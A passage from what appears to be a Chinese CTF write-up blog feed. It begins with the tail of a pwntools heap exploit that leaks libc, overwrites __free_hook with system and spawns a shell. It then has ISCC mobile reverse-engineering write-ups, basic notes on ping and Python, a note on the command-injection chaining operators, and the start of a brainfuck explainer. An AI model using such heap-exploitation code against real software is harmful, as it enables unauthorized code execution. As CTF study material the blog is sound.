<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">a</span>):
   p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(a))
   
<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">a</span>):
   p.sendlineafter(<span class="hljs-string">&quot;choice:&quot;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)
   p.sendlineafter(<span class="hljs-string">&quot;number:&quot;</span>,<span class="hljs-built_in">str</span>(a))

add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;&#x27;</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;&#x27;</span>)
delete(<span class="hljs-number">0</span>)
show(<span class="hljs-number">0</span>)
leak_addr=u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>))
main_arena=leak_addr-<span class="hljs-number">88</span>
malloc_hook=main_arena-<span class="hljs-number">0x10</span>
libc_base=malloc_hook-libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]
heap_addr=<span class="hljs-number">0x000404050</span>
payload=p64(<span class="hljs-number">0</span>)
payload+=p64(<span class="hljs-number">0x2c1</span>)
payload+=p64(heap_addr-<span class="hljs-number">0x18</span>)
payload+=p64(heap_addr-<span class="hljs-number">0x10</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)
add(<span class="hljs-number">0xd8</span>,payload)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)
add(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)
delete(<span class="hljs-number">3</span>)
edit2(<span class="hljs-number">3</span>,<span class="hljs-number">1</span>)
delete(<span class="hljs-number">4</span>)
payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>
payload+=p64(libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>])
edit1(<span class="hljs-number">2</span>,payload)
edit1(<span class="hljs-number">2</span>,p64(libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))
delete(<span class="hljs-number">5</span>)
p.interactive()</code></pre>
<h1 id="mobile"><a href="#mobile" class="headerlink" title="mobile"></a>mobile</h1><h2 id="NOJAVA"><a href="#NOJAVA" class="headerlink" title="NOJAVA"></a>NOJAVA</h2><p>用Jeb打开附件，查找MainActivy函数<br><img src="https://img-blog.csdnimg.cn/2180ccada84e4ce9a8c4ba472c688f05.png" alt="在这里插入图片描述"><br>脚本如下：</p>
<pre><code class="hljs bash">text=<span class="hljs-string">&#x27;iZeejfYefjYZeeYijYjfjijj&#x27;</span>
binary = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(format(ord(i), <span class="hljs-string">&#x27;08b&#x27;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> text)
a = [binary[i:i+4] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, len(binary), 4)]
<span class="hljs-comment"># print(a)</span>
payload=<span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:
<span class="hljs-keyword">if</span> i==<span class="hljs-string">&quot;1001&quot;</span>:
 payload+=<span class="hljs-string">&quot;10&quot;</span>
<span class="hljs-keyword">elif</span> i==<span class="hljs-string">&quot;0110&quot;</span>:
 payload+=<span class="hljs-string">&quot;01&quot;</span>
<span class="hljs-keyword">elif</span> i==<span class="hljs-string">&quot;1010&quot;</span>:
 payload+=<span class="hljs-string">&quot;11&quot;</span>
<span class="hljs-keyword">elif</span> i==<span class="hljs-string">&quot;0101&quot;</span>:
 payload+=<span class="hljs-string">&quot;00&quot;</span>
<span class="hljs-keyword">else</span>:
 <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;waaa&quot;</span>)
result = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(chr(int(payload[i:i+8], 2)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0, len(payload), 8))
<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ISCC&#123;&#x27;</span>+result+<span class="hljs-string">&#x27;&#125;&#x27;</span>)</code></pre>
<p>运行得到flag</p>
<h2 id="WhereisHint"><a href="#WhereisHint" class="headerlink" title="WhereisHint"></a>WhereisHint</h2><p>sBox.txt 文件内容如下：<br>0E000000040000000D00000001000000020000000F0000000B000000080000000300000<br>00A000000060000000C00000005000000090000000000000007000000000000000F0000<br>0007000000040000000E000000020000000D000000010000000A000000060000000C000<br>0000B0000000900000005000000030000000800000004000000010000000E0000000800<br>00000D00000006000000020000000B0000000F0000000C0000000900000007000000030<br>000000A00000005000000000000000F0000000C00000008000000020000000400000009<br>0000000100000007000000050000000B000000030000000E0000000A000000000000000<br>60000000D0000000F00000001000000080000000E000000060000000B00000003000000<br>040000000900000007000000020000000D0000000C00000000000000050000000A00000<br>0030000000D00000004000000070000000F00000002000000080000000E0000000C0000<br>0000000000010000000A00000006000000090000000B00000005000000000000000E000<br>000070000000B0000000A000000040000000D0000000100000005000000080000000C00<br>0000060000000900000003000000020000000F0000000D000000080000000A000000010<br>00000030000000F00000004000000020000000B00000006000000070000000C00000000<br>000000050000000E000000090000000A00000000000000090000000E000000060000000<br>30000000F00000005000000010000000D0000000C000000070000000B00000004000000<br>02000000080000000D00000007000000000000000900000003000000040000000600000<br>00A0000000200000008000000050000000E0000000C0000000B0000000F000000010000<br>000D000000060000000400000009000000080000000F00000003000000000000000B000<br>00001000000020000000C000000050000000A0000000E00000007000000010000000A00<br>00000D0000000000000006000000090000000800000007000000040000000F0000000E0<br>00000030000000B00000005000000020000000C000000070000000D0000000E00000003<br>0000000000000006000000090000000A000000010000000200000008000000050000000<br>B0000000C000000040000000F0000000D000000080000000B0000000500000006000000<br>0F00000000000000030000000400000007000000020000000C000000010000000A00000<br>00E000000090000000A0000000600000009000000000000000C0000000B000000070000<br>000D0000000F00000001000000030000000E00000005000000020000000800000004000<br>000030000000F00000000000000060000000A000000010000000D000000080000000900<br>000004000000050000000B0000000C00000007000000020000000E000000020000000C0<br>000000400000001000000070000000A0000000B00000006000000080000000500000003<br>0000000F0000000D000000000000000E000000090000000E0000000B000000020000000<br>C00000004000000070000000D0000000100000005000000000000000F0000000A000000<br>030000000900000008000000060000000400000002000000010000000B0000000A00000<br>00D00000007000000080000000F000000090000000C0000000500000006000000030000<br>00000000000E0000000B000000080000000C00000007000000010000000E00000002000<br>0000D000000060000000F00000000000000090000000A00000004000000050000000300<br>00000C000000010000000A0000000F00000009000000020000000600000008000000000<br>000000D00000003000000040000000E00000007000000050000000B0000000A0000000F<br>0000000400000002000000070000000C000000090000000500000006000000010000000<br>D0000000E000000000000000B0000000300000008000000090000000E0000000F000000<br>0500000002000000080000000C000000030000000700000000000000040000000A00000<br>0010000000D0000000B000000060000000400000003000000020000000C000000090000<br>00050000000F0000000A0000000B0000000E00000001000000070000000600000000000<br>000080000000D000000040000000B000000020000000E0000000F000000000000000800<br>00000D000000030000000C0000000900000007000000050000000A00000006000000010<br>000000D000000000000000B000000070000000400000009000000010000000A0000000E<br>00000003000000050000000C000000020000000F0000000800000006000000010000000<br>40000000B0000000D0000000C00000003000000070000000E0000000A0000000F000000<br>060000000800000000000000050000000900000002000000060000000B0000000D00000<br>00800000001000000040000000A000000070000000900000005000000000000000F0000<br>000E00000002000000030000000C0000000D00000002000000080000000400000006000<br>0000F0000000B000000010000000A00000009000000030000000E000000050000000000<br>00000C00000007000000010000000F0000000D000000080000000A00000003000000070<br>00000040000000C00000005000000060000000B000000000000000E0000000900000002<br>000000070000000B0000000400000001000000090000000C0000000E000000020000000<br>0000000060000000A0000000D0000000F00000003000000050000000800000002000000<br>010000000E00000007000000040000000A000000080000000D0000000F0000000C00000<br>009000000000000000300000005000000060000000B0000001000000007000000140000<br>00150000001D0000000C0000001C00000011000000010000000F000000170000001A000<br>00005000000120000001F0000000A0000000200000008000000180000000E0000002000<br>00001B0000000300000009000000130000000D0000001E00000006000000160000000B0<br>000000400000019000000<br>用jeb打开附件，分析函数，在其中找到了二进制数据，写python脚本并利用软件爆出flag<br><img src="https://img-blog.csdnimg.cn/006fe45d2dba4861b8dab22200bd3760.png" alt="在这里插入图片描述"></p>
<h2 id="ManyJNI"><a href="#ManyJNI" class="headerlink" title="ManyJNI"></a>ManyJNI</h2><p>用jeb打开附件，查找MainActivy函数<br><img src="https://img-blog.csdnimg.cn/89bca8466d0b40cea664c8249efaea32.png" alt="在这里插入图片描述"><br>解密</p>
<pre><code class="hljs python">dic = &#123;<span class="hljs-string">&quot;1463495029.1088610877&quot;</span>: <span class="hljs-string">&quot;+&quot;</span>, <span class="hljs-string">&quot;1049530879.4255690777&quot;</span>: <span class="hljs-string">&quot;#&quot;</span>, 
<span class="hljs-string">&quot;2862766292.2381007417&quot;</span>: <span class="hljs-string">&quot;$&quot;</span>,
 <span class="hljs-string">&quot;3330444070.1174262214&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;2227920669.2827401366&quot;</span>: <span class="hljs-string">&quot;_&quot;</span>, 
<span class="hljs-string">&quot;1579951362.2846238576&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;368955456.3265704134&quot;</span>: <span class="hljs-string">&quot;T&quot;</span>,
 <span class="hljs-string">&quot;2696190145.613662970&quot;</span>: <span class="hljs-string">&quot;(&quot;</span>, <span class="hljs-string">&quot;3872134833.1068749546&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;891426205.2766473378&quot;</span>: 
<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;1519023352.105877999&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>,
 <span class="hljs-string">&quot;2477809142.443877620&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>, <span class="hljs-string">&quot;2647754101.2230120467&quot;</span>: <span class="hljs-string">&quot;`&quot;</span>, <span class="hljs-string">&quot;3075111042.1323776342&quot;</span>: 
<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;986806734.2777299023&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>,
 <span class="hljs-string">&quot;3896053831.4135235691&quot;</span>: <span class="hljs-string">&quot;?&quot;</span>, <span class="hljs-string">&quot;1184712308.807098365&quot;</span>: <span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;4075828588.429489377&quot;</span>: 
<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;2429787593.619384622&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>,
 <span class="hljs-string">&quot;881206442.1709247634&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;1083538065.1130340170&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;4023341693.1586698450&quot;</span>: 
<span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;155280819.3054501475&quot;</span>: <span class="hljs-string">&quot;W&quot;</span>,
 <span class="hljs-string">&quot;99771100.1051999332&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;4232898851.3300692563&quot;</span>: <span class="hljs-string">&quot;)&quot;</span>, <span class="hljs-string">&quot;64956337.4234499210&quot;</span>: 
<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;2870232400.3722498303&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>,
 <span class="hljs-string">&quot;2841218066.780431097&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;132800239.3878689771&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;2156232310.2823971181&quot;</span>: 
<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;1808290711.212509551&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>,
 <span class="hljs-string">&quot;696150085.2220172189&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;3713618273.3259647236&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;3121040253.2415880190&quot;</span>: 
<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;2858698525.3991735450&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>,
 <span class="hljs-string">&quot;2547227671.698153515&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;654785657.4006927810&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;3711461495.3008240604&quot;</span>: 
<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;3581263639.1952078211&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>,
 <span class="hljs-string">&quot;3164894139.2581098102&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;3160675335.657981347&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1158103192.2450550443&quot;</span>: 
<span class="hljs-string">&quot;~&quot;</span>, <span class="hljs-string">&quot;1236282010.4060431406&quot;</span>: <span class="hljs-string">&quot;A&quot;</span>,
 <span class="hljs-string">&quot;4027068562.440012179&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;351048083.1823512614&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;1462318326.3226159060&quot;</span>: 
<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;2954653653.1618611175&quot;</span>: <span class="hljs-string">&quot;P&quot;</span>,
 <span class="hljs-string">&quot;701073028.312955233&quot;</span>: <span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;666315003.3369729975&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;2853626980.607086523&quot;</span>: 
<span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;19734539.2637167118&quot;</span>: <span class="hljs-string">&quot;@&quot;</span>,
 <span class="hljs-string">&quot;4120373985.112157582&quot;</span>: <span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;2302105109.2843567652&quot;</span>: <span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;1392500071.2693188089&quot;</span>: 
<span class="hljs-string">&quot;^&quot;</span>, <span class="hljs-string">&quot;709910699.3712210805&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>,
 <span class="hljs-string">&quot;3113384841.1999610280&quot;</span>: <span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;1964704696.30454558&quot;</span>: <span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;3016651642.1304626590&quot;</span>: 
<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;924745076.1085575287&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>,
 <span class="hljs-string">&quot;1979386605.348865528&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;3283987997.1614515444&quot;</span>: <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;3248176867.998559740&quot;</span>: 
<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;2460099397.287946231&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,
 <span class="hljs-string">&quot;933728663.4036345491&quot;</span>: <span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;870221498.4165280671&quot;</span>: <span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;700813972.3680578651&quot;</span>: 
<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;2666170697.1050538432&quot;</span>: <span class="hljs-string">&quot;G&quot;</span>,
 <span class="hljs-string">&quot;3735675442.4106461569&quot;</span>: <span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;3944223761.1040972928&quot;</span>: <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;406509623.2197974953&quot;</span>: 
<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;166914849.75133536&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>,
 <span class="hljs-string">&quot;1971216652.4016620168&quot;</span>: <span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;3126027666.2407112104&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;2421050068.877129437&quot;</span>: 
<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;2694837670.239856188&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>,
 <span class="hljs-string">&quot;4259959222.1144992995&quot;</span>: <span class="hljs-string">&quot;&#125;&quot;</span>, <span class="hljs-string">&quot;1986798057.4141497725&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;734889408.680957602&quot;</span>: 
<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;3747360752.949414639&quot;</span>: <span class="hljs-string">&quot;&gt;&quot;</span>,
 <span class="hljs-string">&quot;4099300672.1926520061&quot;</span>: <span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;2965350987.46203785&quot;</span>: <span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;428936951.1911408410&quot;</span>: 
<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;1336447878.2775388247&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>,
 <span class="hljs-string">&quot;4097885373.4018178710&quot;</span>: <span class="hljs-string">&quot;&amp;&quot;</span>, <span class="hljs-string">&quot;1935593237.368431450&quot;</span>: <span class="hljs-string">&quot;Z&quot;</span>, <span class="hljs-string">&quot;529156133.278213883&quot;</span>: 
<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;2381012008.4088810995&quot;</span>: <span class="hljs-string">&quot;R&quot;</span>,
 <span class="hljs-string">&quot;385403258.710806366&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;4273244629.3478477188&quot;</span>: <span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;1802901715.704799359&quot;</span>: 
<span class="hljs-string">&quot;|&quot;</span>, <span class="hljs-string">&quot;930008935.2627182413&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>,
 <span class="hljs-string">&quot;4018804880.2724391126&quot;</span>: <span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;4067852839.2777358486&quot;</span>: <span class="hljs-string">&quot;U&quot;</span>, 
<span class="hljs-string">&quot;1615466436.2634553015&quot;</span>: <span class="hljs-string">&quot;&#123;&quot;</span>&#125;
part1 = 
<span class="hljs-string">&quot;.1579951362.1979386605.2696190145.700813972.891426205.2381012008.4232898851.3248176867.19</span>
<span class="hljs-string">734539.1236282010.529156133.4075828588&quot;</span>[<span class="hljs-number">1</span>:].split(<span class="hljs-string">&quot;.&quot;</span>)
part2 = 
<span class="hljs-string">&quot;.2846238576.348865528.613662970.3680578651.2766473378.4088810995.3300692563.998559740.263</span>
<span class="hljs-string">7167118.4060431406.278213883.429489377&quot;</span>[<span class="hljs-number">1</span>:].split(<span class="hljs-string">&quot;.&quot;</span>)
flag = <span class="hljs-string">&#x27;&#x27;</span>
<span class="hljs-keyword">for</span> a, b <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(part1, part2):
 flag += dic[<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;a&#125;</span>.<span class="hljs-subst">&#123;b&#125;</span>&quot;</span>]
<span class="hljs-keyword">if</span> flag[-<span class="hljs-number">3</span>:] == <span class="hljs-string">&#x27;ANM&#x27;</span>:
 <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ISCC<span class="hljs-subst">&#123;flag[:-<span class="hljs-number">3</span>]&#125;</span>&quot;</span>)
<span class="hljs-keyword">else</span>:
 <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;检查 part1 和 part2 是否正确！&quot;</span>)</code></pre>
<p>执行就可以获取到flag了</p>
<h2 id="ManyMany"><a href="#ManyMany" class="headerlink" title="ManyMany"></a>ManyMany</h2><p>解压附件，改为zip格式，进入lib/arm64-v8a文件夹，用ida打开，搜索stub函数，查找相应字符，利用python脚本爆出flag<br><img src="https://img-blog.csdnimg.cn/b20b57fa905d4fe7a9df2e5e3927ad36.png" alt="在这里插入图片描述"></p>
<h2 id="MobileTest"><a href="#MobileTest" class="headerlink" title="MobileTest"></a>MobileTest</h2><p>用jeb打开分析函数<br><img src="https://img-blog.csdnimg.cn/2f876a00e3b0424eb2d271d886555134.png" alt="在这里插入图片描述"><br>把so文件拖进ida里，在这里下断点动态调试，即可得到key<br><img src="https://img-blog.csdnimg.cn/4e6911b8c9544047ba668e0c6b11d7d4.png" alt="在这里插入图片描述"><br>在jeb里面找到AES的密文，AES解密即可得到flag<br><img src="https://img-blog.csdnimg.cn/0f93238b7ed3495aa6778845b9febe1b.png" alt="在这里插入图片描述"></p>
<h2 id="Whereisflag"><a href="#Whereisflag" class="headerlink" title="Whereisflag"></a>Whereisflag</h2><p>用ida打开附件，根据提示RC4，md5，在ida里面查找到了一段md5密文，去在线网站上解密得到了flag的一部分<br><img src="https://img-blog.csdnimg.cn/8a86e41af72b4f98a07741f32561d730.png" alt="在这里插入图片描述"><br>分析so文件，在此处下断点动态调试，即可获得flag的第二部分<br><img src="https://img-blog.csdnimg.cn/e5fc80ab3f2c4cd09a1f6cb26b1c5285.png" alt="在这里插入图片描述"><br>flag2=128215131d0dd4119e60<br>最终flag为：ISCC[YOU_LIKE_128215131d0dd4119e60]</p>
]]></content>
      <categories>
        <category>WP</category>
      </categories>
  </entry>
  <entry>
    <title>Ping</title>
    <url>/2023/02/23/Ping/</url>
    <content><![CDATA[<p>Ping<br>ping是Windows、Unix和Linux系统下的一个命令。ping也属于一个通信协议，是TCP/IP协议的一部分。利用“ping”命令可以检查网络是否连通，可以很好地帮助我们分析和判定网络故障。<br>应用格式：Ping空格IP地址。该命令还可以加许多参数使用，具体是键入Ping按回车即可看到详细说明。<br>作用：它是用来检查网络是否通畅或者网络连接速度的命令。<br>ping命令的使用方法：<br>方法/步骤<br>首先用快捷键win+R调出运行命令框，输入cmd，点击确定，会弹出DOS窗口。<br>ping命令的应用格式：<br>①ping+IP地址或主机域名；<br>②ping+IP地址或主机域名+命令参数；<br>③ ping+命令参数+IP地址或主机域名 。注意，“+”要换成空格！当我们使用第①种格式时，默认只发送四个数据包。</p>
]]></content>
  </entry>
  <entry>
    <title>Python常用函数语段</title>
    <url>/2023/02/23/Python%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0%E8%AF%AD%E6%AE%B5/</url>
    <content><![CDATA[<p>Python常用函数语段</p>
<h2 id="一-chr-函数"><a href="#一-chr-函数" class="headerlink" title="一.chr() 函数;"></a>一.chr() 函数;</h2><p>chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。<br>chr(i),i – 可以是10进制也可以是16进制的形式的数字。<br>返回值是当前整数对应的 ASCII 字符。<br>例：print chr(78) 结果显示为N<br>比较：ord函数；<br>Ord(“字符串”)  函数返回值类型为int类型<br>例：ord(“0”) 结果显示48</p>
<h2 id="二-for-i-in-range-作用"><a href="#二-for-i-in-range-作用" class="headerlink" title="二.for i in range ()作用"></a>二.for i in range ()作用</h2><p>for i in range ()作用：<br>range()是一个函数， for i in range () 就是给i赋值：<br>比如 for i in range （1，3）：<br>就是把1,2依次赋值给i<br>range () 函数的使用是这样的:<br>range(start, stop[, step])，分别是起始、终止和步长<br>range（3）即：从0到3，不包含3，即0,1,2<br>range(1,3) 即：从1到3，不包含3，即1,2<br>range（1,3,2）即：从1到3，每次增加2，因为1+2=3，所以输出只有1<br>第三个数字2是代表步长。如果不设置，就是默认步长为1<br>解题脚本是这样描述的: for i in range(0,18,3): 意思是 0-18不包括18,三个数为一组</p>
<h2 id="三-split"><a href="#三-split" class="headerlink" title="三.split"></a>三.split</h2><p>split() 方法可以实现将一个字符串按照指定的分隔符切分成多个子串，这些子串会被保存到列表中（不包含分隔符），作为方法的返回值反馈回来。<br>例子:<br>a = “8842101220480224404014224202480122”<br>a = a.split(“0”) 把这一串字符变为:88421, 122 48 2244等</p>
<h2 id="四-for-i-in-a"><a href="#四-for-i-in-a" class="headerlink" title="四 for i in a:"></a>四 for i in a:</h2><p>for循环遍历语法 把a变量里包含的内容以循环的方式一个一个放到i变量里面;<br>例题</p>
<pre><code class="hljs python">a=[<span class="hljs-number">118</span>,<span class="hljs-number">104</span>,<span class="hljs-number">102</span>,<span class="hljs-number">120</span>,<span class="hljs-number">117</span>,<span class="hljs-number">108</span>,<span class="hljs-number">119</span>,<span class="hljs-number">124</span>,<span class="hljs-number">48</span>,<span class="hljs-number">123</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>]
s=<span class="hljs-string">&#x27; &#x27;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:
   s+=<span class="hljs-built_in">chr</span>(i-<span class="hljs-number">3</span>)
<span class="hljs-built_in">print</span>(s)</code></pre>
<p>把a里面的内容一个一个的放入i里面进行运算;</p>
<h2 id="五-def"><a href="#五-def" class="headerlink" title="五.def"></a>五.def</h2><p>意思是自己定义一个函数;<br><img src="https://img-blog.csdnimg.cn/78bf9b9a4d2f47aeba74d8857e15a74f.png" alt="在这里插入图片描述"></p>
<p>这一串即是自己定义的加密函数 encode是加密, decode是解密</p>
<h2 id="六-lower"><a href="#六-lower" class="headerlink" title="六 lower()"></a>六 lower()</h2><p>描述：将字符串中的所有大写字母转换为小写字母。<br>注意 lower()函数和casefold()函数的区别：<br>lower() 方法只对ASCII编码，即‘A-Z’有效，对于其它语言中把大写转换为小写的情况无效，只能用 casefold() 函数。<br>例如:print(t2.lower()) 意思是把t2字符串变为小写字母</p>
<h2 id="七-进制转换函数"><a href="#七-进制转换函数" class="headerlink" title="七 进制转换函数"></a>七 进制转换函数</h2><p><img src="https://img-blog.csdnimg.cn/3617a6639fae4e17acfdd0a1f27fd53f.png" alt="在这里插入图片描述"></p>
<p>原理：python内置函数进行进制转换的原理是将读入的一个字符串（python默认读入的都是字符串形式）转为10进制，然后再用相关函数进行其他进制转换<br>chr(int(s, 16)) 意思是从16进制转10; ASC码转换成字母输出</p>
<h2 id="八-文件的读写"><a href="#八-文件的读写" class="headerlink" title="八 文件的读写"></a>八 文件的读写</h2><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;filename.txt&#x27;</span>) <span class="hljs-keyword">as</span> f:
   data_user=pd.read_csv(f)  <span class="hljs-comment">#文件的读操作</span>

<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:
   f.write(<span class="hljs-string">&#x27;hello world&#x27;</span>)  <span class="hljs-comment">#文件的写操作</span></code></pre>

]]></content>
  </entry>
  <entry>
    <title>WAF</title>
    <url>/2023/02/23/Waf/</url>
    <content><![CDATA[<p>Waf<br>WAF具备限制对某些URI请求次数的能力和限制文件上传功能的能力。<br>windows 或 linux 下:<br>command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2<br>command1 | command2 只执行 command2<br>command1 &amp; command2 先执行 command2 后执行 command1<br>command1 || command2 先执行 command1，如果为假，再执行 command2<br>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）</p>
]]></content>
  </entry>
  <entry>
    <title>brainfuck语言</title>
    <url>/2023/02/23/brainfuck%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<p>brainfuck语言</p>
<p>一，指令<br>BF只有8种有效字符，其实就是8种指令：<br>字符    含义</p>
<blockquote>
<pre><code>  指针加一
</code></pre>
</blockquote>
<p>&lt;       指针减一</p>
<ul>
<li><pre><code>  指针指向的字节的值加一
</code></pre>
</li>
</ul>
<ul>
<li><pre><code>  指针指向的字节的值减一
</code></pre>
</li>
</ul>
<p>.       输出指针指向的单元内容（ASCⅡ码）</p>
<p>,        输入内容到指针指向的单元（ASCⅡ码）</p>
<p>[       如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处</p>
<p>]       如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处<br>这里的指针都是指向一个8位的整数，即char，加减法的溢出规则也是和char型整数的溢出规则一致。<br>纸带是双向的，和图灵机保持一致。<br>二，翻译成C/C++<br>BF可以简单的翻译成C/C++语言：<br>把BF转换成C++代码的C++代码：</p>
<pre><code class="hljs cpp"><span class="hljs-function">string <span class="hljs-title">translate</span><span class="hljs-params">(<span class="hljs-type">char</span> c)</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">switch</span> (c)
    &#123;
    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;&gt;&#x27;</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;p++&quot;</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;&lt;&#x27;</span>:
